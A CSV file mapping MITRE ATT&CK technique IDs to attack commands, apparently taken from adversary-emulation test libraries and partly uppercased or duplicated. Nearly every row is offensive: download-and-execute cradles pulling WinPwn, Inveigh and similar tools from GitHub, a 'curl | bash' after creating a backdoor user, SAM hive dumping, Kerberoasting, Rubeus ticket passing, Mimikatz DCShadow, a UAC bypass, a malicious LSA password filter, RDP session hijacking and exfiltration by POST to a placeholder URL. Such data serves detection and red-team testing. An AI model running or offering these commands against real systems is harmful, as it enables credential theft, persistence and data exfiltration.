mitre_id,command
T1012,"GET-ITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINDOWS"" GET-CHILDITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\"" | FINDSTR WINDOWS GET-ITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNSERVICESONCE"" GET-ITEM -PATH ""HKCU:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNSERVICESONCE"" GET-ITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNSERVICES"" GET-ITEM -PATH ""HKCU:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNSERVICES"" GET-ITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON\NOTIFY"" GET-ITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON\USERINIT"" GET-ITEM -PATH ""HKCU:SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON\\SHELL"" GET-ITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON\\SHELL"" GET-ITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\SHELLSERVICEOBJECTDELAYLOAD"" GET-ITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE"" GET-ITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCEEX"" GET-ITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN"" GET-ITEM -PATH ""HKCU:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN"" GET-ITEM -PATH ""HKCU:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE"" GET-ITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER\RUN"" GET-ITEM -PATH ""HKCU:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER\RUN"" GET-CHILDITEM -PATH ""HKLM:SYSTEM\CURRENTCONTROLSET\SERVICES"" GET-ITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN"" GET-ITEM -PATH ""HKLM:SYSTEM\CURRENTCONTROLSET\CONTROL\SAFEBOOT"" GET-CHILDITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\ACTIVE SETUP\INSTALLED COMPONENTS"" GET-CHILDITEM -PATH ""HKLM:SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\GROUP POLICY\SCRIPTS\STARTUP"""
T1119,get-service > $env:temp\t1119_1.txt get-childitem env: > $env:temp\t1119_2.txt get-process > $env:temp\t1119_3.txt   
T1216,set comspec=#{command_to_execute} cscript %windir%\system32\manage-bde.wsf # id_7384
T1652,kextfind # id_8830
T1652,driverquery /v /fo list driverquery /si /fo list   
T1558,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') kerberoasting -consoleoutput -noninteractive 
T1070,remove-item -path #{file_to_delete}
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""#{plaintext}"")) $key = ""#{key}"" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.length]; } $cyphertext = [system.text.encoding]::utf8.getstring($cyphertext) [system.net.servicepointmanager]::expect100continue = $false invoke-webrequest -uri #{destination_url} -method post -body $cyphertext -disablekeepalive  "
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh # id_7983
T1550,"& ""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" -accepteula \\#{target} -w c:\ -c ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi set-location ""pathtoatomicsfolder\..\externalpayloads"" move-item -force ""\\#{target}\c$\ticket.kirbi"" ticket.kirbi write-host ""successfully retrieved tgt from '#{target}', now requesting a tgs from local"" & ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt remove-item ""pathtoatomicsfolder\..\externalpayloads\ticket.kirbi"" & ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" purge # id_8875"
T1106,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/createprocess/get-createprocesssystem.ps1') # id_7917
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1217,"$url_regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' $history = get-content -path ""#{history_path}"" | select-string -allmatches $url_regex | foreach-object { $_.matches.value } | sort -unique $history | out-file -filepath ""#{dest_path}"""
T1489,sudo pkill -sigterm #{process_pattern}
T1195,"kubectl run #{pod_name} --image=#{image_name} --restart=never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"" "
T1529,SHUTDOWN /S /T #{TIMEOUT}
T1217,"find / -path ""*/.config/chromium/*/bookmarks"" -exec echo {} >> #{output_file} \; cat #{output_file} 2>/dev/null  "
T1105,"$datepath = ""certutil-$(get-date -format yyyy_mm_dd)"" new-item -path $datepath -itemtype directory set-location $datepath certutil -verifyctl -split -f #{remote_file} get-childitem | where-object {$_.name -notlike ""*.txt""} | foreach-object { move-item $_.name -destination #{local_path} }"
T1614,pathtoatomicsfolder\..\externalpayloads\languagekeyboardlayout.exe  
T1003,reg save HKLM\SAM c:\users\public\dump
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { $connectionstring = az storage account show-connection-string --name ""#{storage_account_name}"" --query connectionstring --output tsv # download blob for cleanup $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + ""#{blob_name}"") az storage blob download --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file $tmporiginalfunctioncode --overwrite true if ($lastexitcode -eq 0) { # upload new blob version if download of existing blob succeeded az storage blob upload --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file ""#{file_path_blob}"" --overwrite true } else { write-output ""download original function code failed."" exit 1 } }  "
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region # id_2422"
T1491,"$orglegalnoticecaption = (get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticecaption).legalnoticecaption $orglegalnoticetext = (get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticetext).legalnoticetext $newlegalnoticecaption = ""#{legal_notice_caption}"" $newlegalnoticetext = ""#{legal_notice_text}"" set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticecaption -value $newlegalnoticecaption -type string -force set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticetext -value $newlegalnoticetext -type string -force   "
T1039,COPY \\#{REMOTE}\C$\#{SHARE_FILE} %TEMP%\#{LOCAL_FILE}
T1548,"new-item ""hkcu:\software\classes\ms-settings\shell\open\command"" -force new-itemproperty ""hkcu:\software\classes\ms-settings\shell\open\command"" -name ""delegateexecute"" -value """" -force set-itemproperty ""hkcu:\software\classes\ms-settings\shell\open\command"" -name ""(default)"" -value ""#{executable_binary}"" -force start-process ""c:\windows\system32\computerdefaults.exe"""
T1578,az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus
T1041,"if(-not (test-path #{filepath})){ 1..100 | foreach-object { add-content -path #{filepath} -value ""this is line $_."" } } [system.net.servicepointmanager]::expect100continue = $false $filecontent = get-content -path #{filepath} invoke-webrequest -uri #{destination_url} -method post -body $filecontent -disablekeepalive # id_4355"
T1556,"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`"""" $dc = start-process -filepath cmd.exe -verb runas -argumentlist ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzparam"" # wait for fake dc server to be ready... start-sleep -seconds 5 # server ready, so trigger replication (push) and wait until it finished & ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1560,makecab.exe #{input_file} #{output_file} 
T1563,"QUERY USER SC.EXE CREATE SESSHIJACK BINPATH= ""CMD.EXE /K TSCON #{SESSION_ID} /DEST:#{DESTINATION_ID}"" NET START SESSHIJACK"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)   "
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y"
T1562,"new-item -path #{channelpath} -force set-itemproperty -path #{channelpath} -name ""channelaccess"" -value ""o:syg:syd:(d;;0x1;;;wd)"" restart-service -name eventlog -force -erroraction ignore"
T1216,"cscript.exe /b c:\windows\system32\printing_admin_scripts\en-us\pubprn.vbs localhost ""script:#{remote_payload}"""
T1578,az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus
T1110,cd #{hashcat_exe}\.. #{hashcat_exe} -a 0 -m 1000 -r .\rules\incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}
T1609,kubectl create -f #{path} -n #{namespace} # wait 3 seconds for the instance to come up sleep 3 kubectl exec -n #{namespace} busybox -- #{command} 
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f # id_5722
T1619,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base #{base} -permutations ""#{wordlist}"" -outputfile ""#{output_file}"" "
T1010,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name} # id_8183"
T1526,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-azaccount -credential $credential | out-null get-azdomaininfo -folder #{output_directory} -subscription ""#{subscription_name}"" -verbose"
T1564,"$macro = [system.io.file]::readalltext(""pathtoatomicsfolder\t1564\src\t1564-macrocode.txt"") $macro = $macro -replace ""areplacemea"", ""pathtoatomicsfolder\t1564\bin\extractme.bin"" [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrocode ""$macro"" -officeproduct ""word"" -sub ""extract"" -nowrap  "
T1005,"$startingdirectory = ""#{starting_directory}"" $outputzip = ""#{output_zip_folder_path}"" $fileextensionsstring = ""#{file_extensions}"" $fileextensions = $fileextensionsstring -split "", "" new-item -type directory $outputzip -erroraction ignore -force | out-null function search-files { param ( [string]$directory ) $files = get-childitem -path $directory -file -recurse | where-object { $fileextensions -contains $_.extension.tolower() } return $files } $foundfiles = search-files -directory $startingdirectory if ($foundfiles.count -gt 0) { $foundfilepaths = $foundfiles.fullname compress-archive -path $foundfilepaths -destinationpath ""$outputzip\data.zip"" write-host ""zip file created: $outputzip\data.zip"" } else { write-host ""no files found with the specified extensions."" } # id_7686"
T1074,"invoke-webrequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1074.001/src/discovery.bat"" -outfile #{output_file} # id_9138"
T1069,get-adprincipalgroupmembership #{user} | select name   
T1007,net.exe start >> #{output_file}  
T1489,taskkill.exe /f /im #{process_name} 
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`"""" $dc = start-process -filepath cmd.exe -verb runas -argumentlist ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzparam"" # wait for fake dc server to be ready... start-sleep -seconds 5 # server ready, so trigger replication (push) and wait until it finished & ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1619,"try{$response = invoke-webrequest ""https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}"" -method ""get""} catch [system.net.webexception] {if($_.exception.response -ne $null) {$response = $_.exception.response.getresponsestream() $readresponse = new-object system.io.streamreader($response) $readresponse.basestream.position = 0 $responsebody = $readresponse.readtoend()} else {$responsebody = ""the storage account could not be anonymously accessed.""}} ""response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody"" | out-file -filepath #{output_file} -append"
T1187,"& ""#{petitpotam_path}"" #{captureserverip} #{targetserverip} #{efsapi} write-host ""end of petitpotam attack"""
T1124,date   
T1529,halt -r   
T1110,useradd -g wheel -s /bin/bash -p $(openssl passwd -1 password123) art su art cd /tmp curl -s #{remote_url} |bash
T1564,conhost.exe --headless calc.exe  
T1570,net use * '#{remote_path}' /transport:quic /skipcertcheck copy '#{local_file}' '*:\'  
T1580,"export aws_region=#{aws_region} cd #{stratus_path} echo ""stratus: start warmup."" ./stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" ./stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1134,start-athprocessunderspecificparent -filepath #{file_path} -commandline '#{command_line}' -parentid #{parent_pid}
T1571,TEST-NETCONNECTION -COMPUTERNAME #{DOMAIN} -PORT #{PORT}
T1021,"copy c:\windows\system32\calc.exe 'c:\users\#{user}\appdata\local\microsoft\windowsapps\foxprow.exe' $com = [system.activator]::createinstance([type]::gettypefromprogid(""excel.application"",""#{computer_name}"")) $com.activatemicrosoftapp(""5"")"
T1176,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru"
T1570,NET USE * '#{REMOTE_PATH}' /TRANSPORT:QUIC /SKIPCERTCHECK COPY '#{LOCAL_FILE}' '*:\'
T1123,$MIC = GET-AUDIODEVICE -RECORDING SET-AUDIODEVICE -ID $MIC.ID START-SLEEP -SECONDS 5
T1546,ECHO '#{TEXT_TO_APPEND}' >> /ETC/PROFILE.D/BASH_COMPLETION.SH
T1059,#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}
T1556,"REG.EXE EXPORT HKLM\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA\ ""PATHTOATOMICSFOLDER\T1556.002\LSA_BACKUP.REG"" $PASSWORDFILTERNAME = (COPY-ITEM ""#{DLL_PATH}\#{DLL_NAME}"" -DESTINATION ""C:\WINDOWS\SYSTEM32"" -PASSTHRU).BASENAME $LSAKEY = GET-ITEM ""HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA\"" $NOTIFICATIONPACKAGESVALUES = $LSAKEY.GETVALUE(""NOTIFICATION PACKAGES"") $NOTIFICATIONPACKAGESVALUES += $PASSWORDFILTERNAME SET-ITEMPROPERTY ""HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA\"" ""NOTIFICATION PACKAGES"" $NOTIFICATIONPACKAGESVALUES"
